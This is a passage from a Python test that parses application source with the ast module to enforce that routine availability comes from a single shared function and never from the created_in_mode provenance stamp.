    def decisions(tree) -> list[ast.expr]:
        found: list[ast.expr] = []
        for node in ast.walk(tree):
            if isinstance(node, ast.If | ast.IfExp | ast.While):
                found.append(node.test)
            elif isinstance(node, ast.Compare | ast.BoolOp):
                found.append(node)
        return found

    def function(tree, name: str) -> ast.FunctionDef:
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef) and node.name == name:
                return node
        raise AssertionError(f"{name} is gone — availability moved without this test moving")

    def calls_to(node, method: str) -> list[ast.Call]:
        return [
            inner
            for inner in ast.walk(node)
            if isinstance(inner, ast.Call)
            and isinstance(inner.func, ast.Attribute)
            and inner.func.attr == method
        ]

    routines = ast.parse(_ROUTINES_RPC_SRC.read_text(encoding="utf-8"))

    # 1. One decision, and it is the shared function being CALLED.
    markers = [
        node
        for node in ast.walk(routines)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Name)
        and node.func.id == "_unavailable_marker"
    ]
    assert len(markers) == 1, "expected exactly one unavailability decision in this module"
    decision = markers[0].args[1] if len(markers[0].args) > 1 else None
    assert isinstance(decision, ast.Call) and isinstance(decision.func, ast.Attribute), (
        "the list marker computes availability inline; it must ASK "
        "_routine_needs_dev, so the marker and the run refusal cannot be two answers"
    )
    assert decision.func.attr == "_routine_needs_dev"

    # 2. Dispatch asks the same function, and asks the stamp nothing.
    run = function(routines, "_handle_routine_run")
    assert calls_to(run, "_routine_needs_dev"), (
        "routine.run decides for itself: the refusal and the marker must be the "
        "same function, or a row can be listed usable and refused on click"
    )
    assert not names_stamp(run), (
        "routine.run reads created_in_mode: the stamp records where a routine was "
        "BORN and can never decide what it NEEDS (docs/KNOWN-GAPS.md, closed "
        "2026-08-08)"
    )

    # 3. Nothing in the module BRANCHES on the stamp...
    for node in decisions(routines):
        assert not names_stamp(node), (
            f"rpc/routines.py branches on created_in_mode at line {node.lineno}: it is "
            "display provenance for a badge, and nothing may decide from it"
        )

    # 4. ...and neither does the widget rail's look-through.
    widgets = ast.parse(_WIDGETS_RPC_SRC.read_text(encoding="utf-8"))
    needs_dev = function(widgets, "_widget_needs_dev")
    assert calls_to(needs_dev, "_routine_id_needs_dev"), (
        "the rail answers the routine question itself again; it must ask "
        "rpc/routines.py, or the rail and the library can disagree about one routine"
    )
    assert not names_stamp(needs_dev), "the look-through reads the routine's stamp again"
